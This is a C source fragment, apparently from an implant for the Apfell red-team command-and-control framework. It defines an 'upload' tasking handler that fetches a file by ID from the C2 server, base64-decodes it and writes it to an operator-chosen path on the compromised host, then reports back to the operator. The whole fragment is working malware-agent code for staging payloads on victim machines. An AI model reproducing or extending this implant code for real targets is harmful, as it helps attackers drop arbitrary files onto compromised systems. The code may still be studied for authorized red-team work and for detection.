/* takes in the parameter: {"command":"upload",
                            "params":{
                                "file_id": 4,
                                "remote_path": "/path/to/file/to/write"
                            },
                            "id":"task number"}
* pulls down the file ID from the Apfell server and writes it out to the remote_path*/
int upload(cJSON* json){
    cJSON* params = cJSON_Parse(cJSON_GetObjectItem(json, "params")->valuestring);
    //create room for the file in memory
    unsigned int file_length = 4096;
    unsigned char * file_buffer = malloc(sizeof(char) * file_length);
    //get the file from the Apfell server into local memory
    unsigned int file_id = (unsigned int) cJSON_GetObjectItem(params, "file_id")->valueint;
    global_info->C2.upload(file_id, &file_buffer, &file_length);

    //now that we have the file, we need to base64 decode it before writing it to disk
    unsigned char *final_file_data = b64_decode(file_buffer, &file_length);
    FILE *fptr;
    fptr = fopen(cJSON_GetObjectItem(params, "remote_path")->valuestring,"wb");
    if(fptr == NULL)
    {
        //printf("Failed to open file for writing\n");
        free(file_buffer);
        send_basic_response("Failed to open file", cJSON_GetObjectItem(json, "id")->valueint);
        remove_thread_from_global_info(cJSON_GetObjectItem(json, "id")->valueint);
        cJSON_Delete(json);
        return -1;
    }
    fwrite(final_file_data, file_length, 1, fptr);
    fclose(fptr);
    free(file_buffer);
    free(final_file_data);

    //send a message back to the operator that we successfully wrote to disk
    send_basic_response("Successfully wrote to disk", cJSON_GetObjectItem(json, "id")->valueint);
    remove_thread_from_global_info(cJSON_GetObjectItem(json, "id")->valueint);
    cJSON_Delete(json);
    return SUCCESS;
}

COMMAND_ENDS_HERE
int upload(cJSON *);